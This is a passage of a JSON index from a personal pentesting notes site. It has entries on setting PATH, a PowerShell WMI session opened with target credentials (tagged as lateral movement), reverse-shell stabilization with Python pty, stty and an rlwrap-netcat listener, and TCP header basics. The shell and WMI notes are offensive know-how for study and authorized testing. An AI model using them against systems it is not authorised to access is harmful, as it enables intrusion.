systems.md","title":"Set the PATH in a session on UNIX-like operating systems","links":[],"tags":["Language/Bash","OS/Linux","OS/AIX","HowTo"],"content":"export PATH=$PATH:/some/other/directory","richContent":"&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt;export&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; PATH&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;$PATH&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;:/&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;some&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;/&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;other&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;/&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;directory&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;"},"spells/Set-the-PATH-in-a-session-on-Windows":{"slug":"spells/Set-the-PATH-in-a-session-on-Windows","filePath":"spells/Set the PATH in a session on Windows.md","title":"Set the PATH in a session on Windows","links":[],"tags":["Application/PowerShell","OS/Windows","HowTo"],"content":"set PATH=%PATH%;C:\\Some\\Other\\Directory","richContent":"&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;powershell&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;powershell&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;set PATH&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;=%&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;PATH&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;%;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;C:\\Some\\Other\\Directory&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;"},"spells/Set-up-WMI-in-PowerShell":{"slug":"spells/Set-up-WMI-in-PowerShell","filePath":"spells/Set up WMI in PowerShell.md","title":"Set up WMI in PowerShell","links":[],"tags":["OS/Windows/WMI","Application/PowerShell","HowTo","AttackCycle/LateralMovement"],"content":"# Create PSCredential object for authentication.\n#\n$SECURE_PASSWORD = ConvertTo-SecureString &quot;$TARGET_PASSWORD&quot; `\n                                          -AsPlainText -Force;\n$CREDENTIAL_OBJECT = `\n        New-Object System.Management.Automation.PSCredential `\n                   $TARGET_USER, $SECURE_PASSWORD;\n \n# Start a new WMI session and store the connection information\n# as $session. The protocol used can be either DCOM (RPC using\n# TCP 135, as with sc.exe and schtasks.exe) or WSMAN (WinRM\n# over TCP 5985 or TCP 5986, depending on whether HTTPS is\n# supported by $TARGET_HOST).\n#\n$OPTIONS_OBJECT = New-CimSessionOption -Protocol DCOM\n$SESSION_OBJECT = New-Cimsession `\n                      -ComputerName $TARGET_HOST `\n                      -Credential $CREDENTIAL_OBJECT `\n                      -SessionOption $OPTIONS_OBJECT `\n                      -ErrorAction Stop","richContent":"&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;powershell&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;powershell&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# Create PSCredential object for authentication.&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;$&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;SECURE_PASSWORD&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; =&lt;/span&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt; ConvertTo-SecureString&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;$&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;TARGET_PASSWORD&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; `&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;                                          -&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;AsPlainText &lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;-&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;Force&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;;&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;$&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;CREDENTIAL_OBJECT&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; =&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; `&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;        New-Object&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; System.Management.Automation.PSCredential &lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt;`&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;                   $&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;TARGET_USER&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt;,&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; $&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;SECURE_PASSWORD&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;;&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# Start a new WMI session and store the connection information&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# as $session. The protocol used can be either DCOM (RPC using&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# TCP 135, as with sc.exe and schtasks.exe) or WSMAN (WinRM&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# over TCP 5985 or TCP 5986, depending on whether HTTPS is&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# supported by $TARGET_HOST).&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;$&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;OPTIONS_OBJECT&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; =&lt;/span&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt; New-CimSessionOption&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; -&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;Protocol DCOM&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;$&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;SESSION_OBJECT&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; =&lt;/span&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt; New-Cimsession&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; `&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;                      -&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;ComputerName &lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;$&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;TARGET_HOST&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; `&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;                      -&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;Credential &lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;$&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;CREDENTIAL_OBJECT&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; `&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;                      -&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;SessionOption &lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;$&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;OPTIONS_OBJECT&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; `&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;                      -&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;ErrorAction Stop&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;"},"spells/Shell-stabilization":{"slug":"spells/Shell-stabilization","filePath":"spells/Shell stabilization.md","title":"Shell stabilization","links":["spells/netcat","spells/Python","spells/Automatically-stabilize-a-reverse-shell-with-socat"],"tags":["Application/netcat","Language/Python","Application/rlwrap","Application/socat","Language/Bash"],"content":"Shell “stabilization” refers to the process of making a remote shell behave like a normal local shell — so, allowing interactive programs to work properly, ensuring that input is not echoed inappropriately, etc. In practice, this generally involves creating a second connection from within the “unstable” shell, and then using that (keeping the first connection around just so you can restart the “stabilized” shell if you accidentally exit/kill it).\nA common method of stabilizing netcat shells is to use Python:\n\nStart an instance of Bash connected to an actual PTTY: env TERM=xterm python -c &#039;import pty; pty.spawn(&quot;/bin/bash&quot;)&#039;\nSuspend the reverse shell.\nUse stty raw -echo; fg to switch to raw keycode transmission (so that things like arrow keys get pushed to our remote shell), turn off terminal echo (to prevent seeing commands twice), and foreground the reverse shell.\n\nNote that the stty command can be canceled using reset (after closing the reverse shell). Since echo is turned off, typing this won’t be visible. Trust the force!\nThe rlwrap package will handle almost all of this for you.\nrlwrap -cAr nc -lvnp $PORT\nOr just use socat!\n\n\n                  \n                  Tip\n                  \n                \n\n\nIn none of these cases will the reverse shell pick up on your terminal size, so you’ll need to manually specify it using stty rows and stty cols.\n\n\n","richContent":"&lt;p&gt;Shell “stabilization” refers to the process of making a remote shell behave like a normal local shell — so, allowing interactive programs to work properly, ensuring that input is not echoed inappropriately, etc. In practice, this generally involves creating a &lt;em&gt;second&lt;/em&gt; connection from within the “unstable” shell, and then using that (keeping the first connection around just so you can restart the “stabilized” shell if you accidentally exit/kill it).&lt;/p&gt;\n&lt;p&gt;A common method of stabilizing &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/netcat&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/netcat&quot;&gt;netcat&lt;/a&gt; shells is to use &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/Python&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/Python&quot;&gt;Python&lt;/a&gt;:&lt;/p&gt;\n&lt;ul&gt;\n&lt;li&gt;Start an instance of Bash connected to an actual PTTY: &lt;code&gt;env TERM=xterm python -c &#039;import pty; pty.spawn(&quot;/bin/bash&quot;)&#039;&lt;/code&gt;&lt;/li&gt;\n&lt;li&gt;Suspend the reverse shell.&lt;/li&gt;\n&lt;li&gt;Use &lt;code&gt;stty raw -echo; fg&lt;/code&gt; to switch to raw keycode transmission (so that things like arrow keys get pushed to our remote shell), turn off terminal echo (to prevent seeing commands twice), and foreground the reverse shell.&lt;/li&gt;\n&lt;/ul&gt;\n&lt;p&gt;Note that the stty command can be canceled using &lt;code&gt;reset&lt;/code&gt; (after closing the reverse shell). Since echo is turned off, typing this won’t be visible. Trust the force!&lt;/p&gt;\n&lt;p&gt;The rlwrap package will handle almost all of this for you.&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;rlwrap&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -cAr&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; nc&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -lvnp&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; $PORT&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;Or &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/Automatically-stabilize-a-reverse-shell-with-socat&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/Automatically-stabilize-a-reverse-shell-with-socat&quot;&gt;just use socat&lt;/a&gt;!&lt;/p&gt;\n&lt;blockquote class=&quot;callout tip&quot; data-callout=&quot;tip&quot;&gt;\n&lt;div class=&quot;callout-title&quot;&gt;\n                  &lt;div class=&quot;callout-icon&quot;&gt;&lt;/div&gt;\n                  &lt;div class=&quot;callout-title-inner&quot;&gt;&lt;p&gt;Tip&lt;/p&gt;&lt;/div&gt;\n                  \n                &lt;/div&gt;\n&lt;div class=&quot;callout-content&quot;&gt;\n&lt;div class=&quot;callout-content-inner&quot;&gt;\n&lt;p&gt;In &lt;em&gt;none&lt;/em&gt; of these cases will the reverse shell pick up on your terminal size, so you’ll need to manually specify it using &lt;code&gt;stty rows&lt;/code&gt; and &lt;code&gt;stty cols&lt;/code&gt;.&lt;/p&gt;\n&lt;/div&gt;\n&lt;/div&gt;\n&lt;/blockquote&gt;"},"spells/TCP-header-flags":{"slug":"spells/TCP-header-flags","filePath":"spells/TCP header flags.md","title":"TCP header flags","links":["spells/TCP"],"tags":["Protocol/TCP"],"content":"\nURG — Process the current TCP packet immediately. Directs the receiving system to examine the “urgent pointer” field.\nACK — Acknowledgement. Directs the receiving system to examine the “acknowledgement number” field.\nPSH — Push. Elevate the priority of the packet’s data, but does not otherwise change rules around packet processing.\nRST — Reset. Terminates the connection forcefully.\nSYN — Synchronize. Used during the initial three-way handshake to set a shared (starting) sequence number.\nFIN — Finish. Indicates that the connection may be dropped gracefully.\n","richContent":"&lt;ul&gt;\n&lt;li&gt;URG — Process the current &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/TCP&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/TCP&quot;&gt;TCP&lt;/a&gt; packet immediately. Directs the receiving system to examine the “urgent pointer” field.&lt;/li&gt;\n&lt;li&gt;ACK — Acknowledgement. Directs the receiving system to examine the “acknowledgement number” field.&lt;/li&gt;\n&lt;li&gt;PSH — Push. Elevate the priority of the packet’s data, but does not otherwise change rules around packet processing.&lt;/li&gt;\n&lt;li&gt;RST — Reset. Terminates the connection forcefully.&lt;/li&gt;\n&lt;li&gt;SYN — Synchronize. Used during the initial three-way handshake to set a shared (starting) sequence number.&lt;/li&gt;\n&lt;li&gt;FIN — Finish. Indicates that the connection may be dropped gracefully.&lt;/li&gt;\n&lt;/ul&gt;"},"spells/TCP-headers":{"slug":"spells/TCP-headers","filePath":"spells/TCP headers.md","title":"TCP headers","links":["spells/TCP","spells/TCP-header-flags"],"tags":["Protocol/TCP"],"content":"\nTime to Live (TTL) — How long a packet should live on the network before being discarded.\nSource port — A random (unused) port chosen by the sender.\nDestination port — The port on the receiving end, which normally is determined by the application being used.\nSource address — “From” IP address.\nDestination address — “To” IP address.\nSequence number — A random number that identifies a given connection.\nAcknowledgement number — Starts at the sequence number and then increases by the number of bytes received in the previous packet (or 1 is the previous packet did not include a data segment). Used to ensure that no data is lost, and that packets are reassembled in the right order.\nChecksum — Integrity check.\nData — The, well, data.\nFlag(s) — How the packet should be handled (SYN, ACK, FIN, RST, etc.).\n\nThere’s potentially a lot more detail than this in a TCP packet header, however.\nAcknowledgement number\nThe TCP “acknowledgment number” contains the next sequence number that the sender is expecting to receive (so basically senders determine the next sequence number). This is the current sequence number (for the other host) + the number of bytes in the data segment of the packet being sent to that host.\nPackets with a zero-length data segment that start or continue a conversation (for example, SYN packets) get their sequence/acknowledgement number incremented by 1. This is called a “ghost byte”.\nThe acknowledgement number for RST packets is always 0.\nThe initial SYN packet that starts the three-way handshake should not have an acknowledgement number\nFlags\nTransclude of TCP-header-flags","richContent":"&lt;ul&gt;\n&lt;li&gt;Time to Live (TTL) — How long a packet should live on the network before being discarded.&lt;/li&gt;\n&lt;li&gt;Source port — A random (unused) port chosen by the sender.&lt;/li&gt;\n&lt;li&gt;Destination port — The port on the receiving end, which normally is determined by the application being used.&lt;/li&gt;\n&lt;li&gt;Source address — “From” IP address.&lt;/li&gt;\n&lt;li&gt;Destination address — “To” IP address.&lt;/li&gt;\n&lt;li&gt;Sequence number — A random number that identifies a given connection.&lt;/li&gt;\n&lt;li&gt;Acknowledgement number — Starts at the sequence number and then increases by the number of bytes received in the previous packet (or 1 is the previous packet did not include a data segment). Used to ensure that no data is lost, and that packets are reassembled in the right order.&lt;/li&gt;\n&lt;li&gt;Checksum — Integrity check.&lt;/li&gt;\n&lt;li&gt;Data — The, well, data.&lt;/li&gt;\n&lt;li&gt;Flag(s) — How the packet should be handled (SYN, ACK, FIN, RST, etc.).&lt;/li&gt;\n&lt;/ul&gt;\n&lt;p&gt;There’s potentially &lt;em&gt;a lot&lt;/em&gt; more detail than this in a &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/TCP&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/TCP&quot;&gt;TCP&lt;/a&gt; packet header, however.&lt;/p&gt;\n&lt;h2 id=&quot;acknowledgement-number&quot;&gt;Acknowledgement number&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#acknowledgement-number&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;p&gt;The &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/TCP&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/TCP&quot;&gt;TCP&lt;/a&gt; “acknowledgment number” contains the &lt;em&gt;next&lt;/em&gt; sequence number that the sender is expecting to receive (so basically senders determine the next sequence number). This is the current sequence number (for the other host) + the number of bytes in the data segment of the packet being sent to that host.&lt;/p&gt;\n&lt;p&gt;Packets with a zero-length data segment that start or continue a conversation (for example, SYN packets) get their sequence/acknowledgement number incremented by 1. This is called a “ghost byte”.&lt;/p&gt;\n&lt;p&gt;The acknowledgement number for RST packets is always 0.&lt;/p&gt;\n&lt;p&gt;The initial SYN packet that starts the three-way handshake should &lt;em&gt;not&lt;/em&gt; have an acknowledgement number&lt;/p&gt;\n&lt;h2 id=&quot;flags&quot;&gt;Flags&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#flags&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;p&gt;&lt;/p&gt;&lt;blockquote class=&quot;transclude&quot; data-url=&quot;TCP-header-flags&quot; data-block=&quot;&quot; data-embed-alias=&quot;TCP header flags&quot;&gt;&lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/TCP-header-flags&quot; class=&quot;transclude-inner internal alias&quot; data-slug=&quot;spells/TCP-header-flags&quot;&gt;Transclude of TCP-header-flags&lt;/a&gt;&lt;/blockquote&gt;&lt;p&gt;&lt;/p&gt;"},"spells/TCP-window-size":{"slug":"spells/TCP-window-size","filePath":"spells/TCP window size.md","title":"TCP window size","links":["spells/TCP"],"tags":["Protocol/TCP"],"content":"The TCP “Window” is the maximum number of bits that the sending system expects to receive from a request (it represents the current buffer size for that connection on that system). This is a 2-byte number, such that the maximum (unscaled) window size if 65535 bytes.","richContent":"&lt;p&gt;The &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/TCP&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/TCP&quot;&gt;TCP&lt;/a&gt; “Window” is the maximum number of bits that the sending system expects to receive from a request (it represents the current buffer size for that connection on that system). This is a 2-byte number, such that the maximum (unscaled) window size if 65535 bytes.&lt;/p&gt;"},"spells/TCP":{"slug":"spells/TCP","filePath":"spells/TCP.md","title":"TCP","links":["spells/OSI-model","spells/TCP-headers","spells/TCP-window-size","spells/Wireshark"],"tags":["Protocol/TCP","Standard/OSI","Application/Wireshark"],"content":"The “Transmission Control Protocol”. TCP was formalized in September 1981 in RFC 793.\nThe TCP model\n\nLayer 4: Application (highest)\nLayer 3: Transport\nLayer 2: Internet\nLayer 1: Network interface (lowest)\n\nOSI vs. TCP models\nRoughly, the TCP Model encapsulates the OSI Model.\n+--------------+-------------------+\n| OSI LAYER    | TCP/IP LAYER      |\n+--------------+-------------------+\n| Application  |                   |\n+--------------+                   |\n| Presentation | Application       |\n+--------------+                   |\n| Session      |                   |\n+--------------+-------------------+\n| Transport    | Transport         |\n+--------------+-------------------+\n| Network      | Internet          |\n+--------------+-------------------+\n| Data Link    |                   |\n+--------------+ Network Interface |\n| Physical     |                   |\n+--------------+-------------------+\n\nPacket headers\nTransclude of TCP-headers\nTCP window size\nTransclude of TCP-window-size\nTCP options\nTCP “options” are set in the initial handshake (the initiating host will propose in the SYN packet, and the receiving host will reply with what it supports in the SYN/ACK packet). Note that each system sets its own window scale and MSS values (but these value must be set by both hosts in order to be used in a connection).\n\nWindow Scale — Set the multiplier for the window size (see above) as as a power of two, such that a “Window scale” of 7 is a multiplier of 2⁷ = 128. Window scales can be up to 14, which allows (once multiplied with the maximum window size) up to 1 GB of data to be transmitted before an ACK is required. Typically set to 2 for webservers, or to 0 for systems that wish to allow the use of this option in a conversation but don’t support large buffers themselves.\nMaximum Segment Size (MSS) — The maximum data segment size that a system can receive. This is different than the window size, which is the amount of data that a system expects before it gets an ACK (it’s basically that system’s buffer for this connection).\nSelective Acknowledgement (SACK) — Allows for packets to be acknowledged as they are received, rather than at the end of a window. Using SACK allows for dropped packets to be retransmitted sooner, and prevents the retransmission of packets that were properly received after a dropped packet. However, using SACK requires that the transmitting host keep track of what packets were sent in memory, which means that it’s typically not set on resource-constrained systems (IoT, etc.).\nNo-Op (NOP) — A “blank” value (01) used to pad out the options field, since header size must be a power of two bytes but (1) each option need to fall on a byte boundary and (2) we may not have enough options to fill out the space requested. How NOPs are used is highly implementation-dependent. NOPs can also be used by middle-boxes (firewalls, routers, etc.) to strip options.\n\nIf SACK is used, then acknowledge packet numbers are also placed in the options block.\nDifferences in how TCP options are responded to for incoming SYN packets or ordered for outgoing SYN/ACK packets are important for fingerprinting operating systems and TCP stacks.\nThe initial round trip time\nThe “initial round trip time” (IRTT) is the time taken for the initial SYN packet in the TCP handshake to the final ACK packet in the initial three-way handshake. Most TCP implementations will initially wait for up to 0.5 seconds until retransmitting a packet, but will dynamically adjust this to 3x – 4x the IRTT after the initial handshake. Wireshark will report the IRTT value in the final ACK packet of the three-way handshake.","richContent":"&lt;p&gt;The “Transmission Control Protocol”. TCP was formalized in September 1981 in &lt;a href=&quot;https://datatracker.ietf.org/doc/html/rfc793.html&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;RFC 793&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;.&lt;/p&gt;\n&lt;h2 id=&quot;the-tcp-model&quot;&gt;The TCP model&lt;a 